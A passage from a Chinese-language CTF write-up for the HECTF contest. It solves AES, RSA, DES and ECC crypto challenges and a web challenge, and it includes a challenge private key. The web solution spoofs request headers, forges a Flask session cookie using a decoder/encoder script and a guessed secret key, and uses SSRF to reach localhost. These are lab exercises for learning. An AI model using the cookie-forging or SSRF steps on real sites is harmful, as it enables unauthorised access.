class="line"><span class="comment">#     execute_program()</span></span><br><span class="line"></span><br><span class="line">data = <span class="number">113271863767201424639329153097952947311122854394813183532903131317262533549675</span></span><br><span class="line">c = <span class="string">b&#x27;_1\x16\xc2;\xb1\xddy\x14\xdd\x14\xe5&#123;\x19\x04:&#x27;</span></span><br><span class="line">data = data ^ <span class="number">1</span></span><br><span class="line">key = long_to_bytes(data)[:<span class="number">16</span>] * <span class="number">2</span></span><br><span class="line">iv = bytes_to_long(key) ^ data</span><br><span class="line">iv = long_to_bytes(iv) </span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">dec_flag = aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(dec_flag)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>第二关：</p><p>直接分解n</p><p>获得一系列小素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n= <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c= <span class="number">7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172</span></span><br><span class="line"><span class="comment"># P = [2217990919</span></span><br><span class="line"><span class="comment"># ,4278428893</span></span><br><span class="line"><span class="comment"># , 2804303069</span></span><br><span class="line"><span class="comment"># , 3654864131</span></span><br><span class="line"><span class="comment"># , 2923072267</span></span><br><span class="line"><span class="comment"># , 2338725373</span></span><br><span class="line"><span class="comment"># , 2706073949</span></span><br><span class="line"><span class="comment"># , 2970591037</span></span><br><span class="line"><span class="comment"># , 2370292207</span></span><br><span class="line"><span class="comment"># , 2463878387</span></span><br><span class="line"><span class="comment"># , 3939901243</span></span><br><span class="line"><span class="comment"># , 2794985117</span></span><br><span class="line"><span class="comment"># , 3207148519</span></span><br><span class="line"><span class="comment"># , 4093178561</span></span><br><span class="line"><span class="comment"># , 3831680819]</span></span><br><span class="line">P = [<span class="number">2217990919</span></span><br><span class="line">,<span class="number">4278428893</span></span><br><span class="line">,<span class="number">2794985117</span></span><br><span class="line">,<span class="number">3831680819</span></span><br><span class="line">,<span class="number">2804303069</span></span><br><span class="line">,<span class="number">2923072267</span></span><br><span class="line">,<span class="number">3939901243</span></span><br><span class="line">,<span class="number">2463878387</span></span><br><span class="line">,<span class="number">2970591037</span></span><br><span class="line">,<span class="number">2706073949</span></span><br><span class="line">,<span class="number">3654864131</span></span><br><span class="line">,<span class="number">2370292207</span></span><br><span class="line">,<span class="number">2338725373</span></span><br><span class="line">,<span class="number">4093178561</span></span><br><span class="line">,<span class="number">3207148519</span>]</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">    phi *= P[i]-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># m = 10657149102724042824057034258679160487094630140056870412930577982121073769242507083776</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>进入第三关：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTjdPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBYS1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+Xqweu</span><br><span class="line"></span><br><span class="line">DES CBC PKCS7 key：hectf iv：<span class="number">0000</span></span><br></pre></td></tr></table></figure><p>找到一个<a href="https://the-x.cn/cryptography/Des.aspx">在线网址</a> 很多是无法操作的 但是这个可以</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119103228110.png" alt="image-20231119103228110"></p><p>成功获得flag：<code>HECTF&#123;DES_RSA_AES_WOMENSA_ZHENQIANG&#125;</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119162730981.png" alt="image-20231119162730981"></p><h3 id="esayecc"><a href="#esayecc" class="headerlink" title="esayecc"></a>esayecc</h3><h4 id="考点：ECC椭圆曲线加密"><a href="#考点：ECC椭圆曲线加密" class="headerlink" title="考点：ECC椭圆曲线加密"></a>考点：ECC椭圆曲线加密</h4><h4 id="解题：-2"><a href="#解题：-2" class="headerlink" title="解题："></a>解题：</h4><p>首先给了一个私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgotFz7q/WASYctvjN</span><br><span class="line">Cm4zE7fkywF7jJV0nIME7bsW2i6hRANCAARClk9phO799cZ7E/ZF3ByjzczSz2Wd</span><br><span class="line">fuVuLvrNSK0wlUCXegI/pVSDhvLM9diYBj0hear1pO4tA89Kttmsl4Bf</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>利用在线网址进行解密 获得公钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQpZPaYTu/fXGexP2Rdwco83M0s9l</span><br><span class="line">nX7lbi76zUitMJVAl3oCP6VUg4byzPXYmAY9IXmq9aTuLQPPSrbZrJeAXw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>利用<a href="https://www.ssleye.com/ssltool/pub_asysi.html">在线工具</a> 对公钥文件进行解密:</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119101454309.png" alt="image-20231119101454309"></p><p>原题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> ECC</span><br><span class="line"><span class="keyword">from</span> fastecdsa <span class="keyword">import</span> curve</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">me = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">key = ECC.generate(curve=<span class="string">&#x27;NIST P-256&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;pem.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(key.export_key(<span class="built_in">format</span>=<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">G = key.public_key()</span><br><span class="line">k = key.d</span><br><span class="line">n = G.order()</span><br><span class="line">p = curve.P256.p</span><br><span class="line">r = randprime(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">M = E.random_point()</span><br><span class="line"><span class="comment"># M = (mx, my)</span></span><br><span class="line">e = nextprime(my-mx)</span><br><span class="line">N = n * p</span><br><span class="line">c = <span class="built_in">pow</span>(me, e, <span class="built_in">int</span>(N))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">K = k*G</span><br><span class="line">c1 = M+r*K</span><br><span class="line">c2 = r*G</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 340411986008332622492252515156919590702658555525072399052451683041772652474839788525448087771416400264570261404595656046016551644464496921197111421138765</span></span><br><span class="line"><span class="comment"># c1 = (71430232672331113271988412132459391678542075997754159037222774180961171917977 : 62238630405406252154015032808640586594811636815028129383858020738965206372881 : 1)</span></span><br><span class="line"><span class="comment"># c2 = (25742109236464952840117078659367834030129507446418393682693133323915430074859 : 65657711071079869088595294059522027768683424454908946840021611773238453793364 : 1)</span></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>首先本地访问：</p><p><code>X-Forwarded-For: 127.0.0.1</code></p><p>然后Referer：</p><p><code>Referer: ctf.sc0de.com</code></p><p>最后使用的浏览器：</p><p><code>User-Agent: Firefox</code></p><p>然后进入username的检测</p><p>我们发现在输入框中 单纯输入<code>zxk1ing</code> 是无法成功进入的</p><p>注意到存在session</p><p>把session利用下面脚本进行解密  <a href="https://m.freebuf.com/articles/web/331823.html">脚本来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure><p>首先对原始session进行解密：</p><p>在终端输入命令行启动 -s后面接的是密钥 我们推测是这个名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -s <span class="string">&quot;zxk1ing&quot;</span> -c <span class="string">&quot;eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJqb2tlciJ9.ZVmUuQ.FGqtCpSwv-lmNqDzTIFxpoS66Ck&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;zxk1ing&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;joker&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到存在关键词username</p><p>把username改成<code>zxk1ing</code></p><p>然后加密 生成伪造的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session.py encode -s <span class="string">&quot;zxk1ing&quot;</span> -t <span class="string">&quot;&#123;&#x27;key&#x27;: &#x27;zxk1ing&#x27;, &#x27;username&#x27;: &#x27;zxk1ing&#x27;&#125;&quot;</span>                   </span><br><span class="line">eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVmW3A.Vp7Tyn1njNuyFxSO4TPpoqC__qk</span><br></pre></td></tr></table></figure><p>替换原来session后成功进入</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119131909449.png" alt="image-20231119131909449"></p><p>然后访问<code>/P1aceuWillneverkn0w</code> 进入之后只有一张图片</p><p>意料之外</p><p>既然里面加了引号 肯定是有节目的</p><p>查看一下这个图片的地址</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215745106.png" alt="image-20231119215745106"></p><p>考虑到&#x3D;&#x3D;ssrf&#x3D;&#x3D;</p><p>把他复制然后访问</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215813666.png" alt="image-20231119215813666"></p><p>前面会自动拼接题目的网址 后面跟图片的URL</p><p>然后根据本地的特性提醒</p><p>我们去访问<code>127.0.0.1/P1aceuWillneverkn0w</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215920527.png" alt="image-20231119215920527"></p><p>成功获得flag ： <code>HECTF&#123;04800e5c552a70de9ef7a9cd00a26c90c107e010&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/21/hello-world/"/>
      <url>/2023/11/21/hello-world/</url>
      
